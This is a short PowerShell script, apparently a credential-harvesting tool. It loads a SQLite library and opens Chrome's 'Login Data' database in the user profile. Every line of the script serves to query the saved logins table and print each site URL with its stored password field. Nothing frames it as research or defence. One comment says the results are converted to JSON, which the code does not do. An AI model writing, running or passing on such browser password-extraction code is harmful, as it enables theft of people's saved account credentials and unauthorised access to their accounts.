# # Load SQLite assembly
# Invoke-WebRequest -Uri "http://system.data.sqlite.org/blobs/1.0.113.0/sqlite-netFx45-binary-x64-2012-1.0.113.0.zip" -OutFile $env:temp\sqlite.zip
# mkdir $env:temp\sqlite.net
# Expand-Archive $env:temp\sqlite.zip -DestinationPath $env:temp\sqlite.net


Add-Type -Path "$env:temp\sqlite.net\System.Data.SQLite.dll"

# Open the SQLite database
$databasePath =  "$env:USERPROFILE\appdata\local\Google\Chrome\User Data\Default\Login Data"
$sqlQuery = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"

# Execute the query
$connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$databasePath"
$connection.Open()

# Execute the SQL query
$command = $connection.CreateCommand()
$command.CommandText = $sqlQuery
$reader = $command.ExecuteReader()

# Convert query results to JSON
while ($reader.Read()) {
    # Access data using reader.GetValue() or reader["ColumnName"]
    $value = $reader.GetValue(0)
    $pass = $reader.GetValue(3)
    Write-Host "Key: $value, Pass: $pass"
}

# Close the database connection
$connection.Close()

